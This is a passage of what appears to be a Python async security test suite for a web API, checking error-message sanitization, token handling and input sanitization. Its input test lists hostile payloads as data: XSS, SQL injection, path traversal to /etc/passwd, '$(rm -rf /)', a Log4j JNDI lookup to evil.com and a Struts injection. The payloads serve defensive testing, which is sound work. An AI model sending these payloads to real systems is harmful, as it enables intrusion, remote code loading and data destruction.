                test_data = {'name': malicious_input}
                status, response, req_duration, resp_headers = await self._make_request('POST', '/configurations', headers, test_data)
                
                # Check if error message contains the unsanitized input
                if isinstance(response, str):
                    if malicious_input not in response:
                        sanitized_responses += 1
                else:
                    # Non-string responses are generally safe
                    sanitized_responses += 1
            
            duration = time.time() - start_time
            if sanitized_responses == len(malicious_inputs):
                result = TestResult("test_error_message_sanitization", "PASS", duration, 
                                  f"All {len(malicious_inputs)} error messages properly sanitized")
            else:
                result = TestResult("test_error_message_sanitization", "FAIL", duration, 
                                  f"Error message sanitization issues: only {sanitized_responses}/{len(malicious_inputs)} properly sanitized")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_error_message_sanitization", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_session_management(self):
        """Test session management and token handling"""
        start_time = time.time()
        
        try:
            # Test different token scenarios
            token_scenarios = [
                {'Authorization': 'Bearer valid_looking_token_12345'},
                {'Authorization': 'Bearer expired_token'},
                {'Authorization': 'Bearer malformed_token!@#'},
                {'Authorization': 'Bearer ' + 'x' * 500},  # Very long token
                {},  # No authorization
            ]
            
            consistent_auth = 0
            
            for headers in token_scenarios:
                status, response, req_duration, resp_headers = await self._make_request('GET', '/configurations', headers)
                
                # Should consistently handle different auth scenarios
                if status in [401, 403]:
                    consistent_auth += 1
            
            duration = time.time() - start_time
            if consistent_auth >= len(token_scenarios) * 0.8:
                result = TestResult("test_session_management", "PASS", duration, 
                                  f"Session management consistent: {consistent_auth}/{len(token_scenarios)} scenarios handled properly")
            else:
                result = TestResult("test_session_management", "FAIL", duration, 
                                  f"Inconsistent session management: only {consistent_auth}/{len(token_scenarios)} scenarios handled properly")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_session_management", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_input_sanitization(self):
        """Test input sanitization across all endpoints"""
        start_time = time.time()
        
        try:
            dangerous_inputs = [
                '<script>alert("xss")</script>',
                '"; DROP TABLE users; --',
                '../../../etc/passwd',
                '$(rm -rf /)',
                '${jndi:ldap://evil.com/a}',  # Log4j injection
                '%{#context["xwork.MethodAccessor.denyMethodExecution"]=false}',  # Struts injection
            ]
            
            sanitized_inputs = 0
            headers = self._create_mock_auth_header()
            
            # Test across different fields and endpoints
            test_combinations = [
                ('/configurations', 'name'),
                ('/configurations', 'description'),
                ('/rounds', 'name'),
                ('/scores', 'roundId'),
                ('/user-profiles', 'username'),
            ]
            
            for endpoint, field in test_combinations:
                for dangerous_input in dangerous_inputs:
                    test_data = {field: dangerous_input}
                    status, response, req_duration, resp_headers = await self._make_request('POST', endpoint, headers, test_data)
                    
                    # Should not return the dangerous input unsanitized
                    if isinstance(response, str) and dangerous_input not in response:
                        sanitized_inputs += 1
                    elif not isinstance(response, str):
                        sanitized_inputs += 1
            
            total_tests = len(test_combinations) * len(dangerous_inputs)
            duration = time.time() - start_time
            
            if sanitized_inputs >= total_tests * 0.9:
                result = TestResult("test_input_sanitization", "PASS", duration, 
                                  f"Input sanitization effective: {sanitized_inputs}/{total_tests} inputs properly sanitized")
            else:
                result = TestResult("test_input_sanitization", "FAIL", duration, 
                                  f"Input sanitization issues: only {sanitized_inputs}/{total_tests} inputs properly sanitized")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_input_sanitization", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)